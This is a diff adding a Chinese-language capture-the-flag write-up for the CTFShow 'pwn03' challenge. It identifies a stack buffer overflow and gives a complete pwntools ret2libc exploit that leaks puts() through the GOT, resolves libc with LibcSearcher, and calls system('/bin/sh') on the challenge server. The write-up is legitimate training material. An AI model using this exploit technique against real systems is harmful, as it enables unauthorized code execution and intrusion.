@@ -471,3 +471,61 @@ io.sendline(payload)
 io.interactive()
 ```
 
+------
+
+#### pwn03
+
+先`file ./pwn03`查看文件类型再`checksec --file=pwn03`检查了一下文件保护情况。
+
+![](https://paper.tanyaodan.com/CTFShow/pwn03/1.png)
+
+用`IDA Pro 32bit`打开附件`pwn03`，按`F5`反汇编源码并查看主函数，发现`pwnme()`函数很可疑。
+
+![](https://paper.tanyaodan.com/CTFShow/pwn03/2.png)
+
+双击`pwnme()`函数查看详情，发现该函数中有个局部变量`s`是`char`型数组，`s`的长度只有`0x9`，即可用栈大小只有`9`字节，但是`fgets()`函数读取输入到变量`s`时限制输入`100`个字节，显然存在栈溢出漏洞。
+
+![](https://paper.tanyaodan.com/CTFShow/pwn03/3.png)
+
+双击`s`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x9`个字节占满`buf`变量，然后再加上`r`的`4`个字节。
+
+![](https://paper.tanyaodan.com/CTFShow/pwn03/4.png)
+
+在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`puts()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`puts()`函数的`plt`表和`got`表地址，进行栈溢出并通过`puts()`函数泄露`puts()`函数在`got`表中的真实地址后，进而判断`libc`的版本，然后我们可以根据`libc`版本中`puts()`函数的偏移地址来计算出`libc`的基址地址，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，从而构造`shellcode`拿到`flag`。
+
+```python
+from pwn import *
+from LibcSearcher import *
+
+context(arch='i386', os='linux', log_level='debug')
+# io = process('pwn03')
+io = remote('pwn.challenge.ctf.show', 28067)
+e = ELF('pwn03')
+puts_plt = e.plt['puts']
+log.success('puts_plt => %s' % hex(puts_plt))
+puts_got = e.got['puts']
+log.success('puts_got => %s' % hex(puts_got))
+main_address = e.symbols['main']
+log.success('main_address => %s' % hex(main_address))
+# 先让栈溢出，再利用puts函数的plt表地址来泄露puts函数got表中的真实地址
+payload = b'a'*0x9 + b'fuck' + p32(puts_plt) + p32(main_address) + p32(puts_got)
+io.sendline(payload)
+io.recvuntil('\n\n')
+puts_address = u32(io.recv(4)) # 接收4个字节并解包
+log.success('puts_address => %s' % hex(puts_address))
+libc = LibcSearcher('puts', puts_address) # 获取libc版本,libc6-i386_2.27-3ubuntu1_amd64
+libcbase = puts_address-libc.dump('puts')  # libc的基址=puts()函数地址-puts()函数偏移地址(0x67360)
+log.success('libcbase_address => %s' % hex(libcbase))
+system_address = libcbase + libc.dump('system') #system()函数的地址=libc的基址+system()函数偏移地址(0x03cd10)
+log.success('system_address => %s' % hex(system_address))
+bin_sh_address = libcbase + libc.dump('str_bin_sh') #'/bin/sh'的地址=libc的基址+'/bin/sh'偏移地址(0x17b8cf)
+log.success('bin_sh_address => %s' % hex(bin_sh_address))
+payload = b'a'*0x9 + b'fuck' + p32(system_address) + p32(0xdeadbeef) + p32(bin_sh_address)
+io.sendline(payload)
+io.interactive()
+```
+
+![](https://paper.tanyaodan.com/CTFShow/pwn03/5.png)
+
+------
+
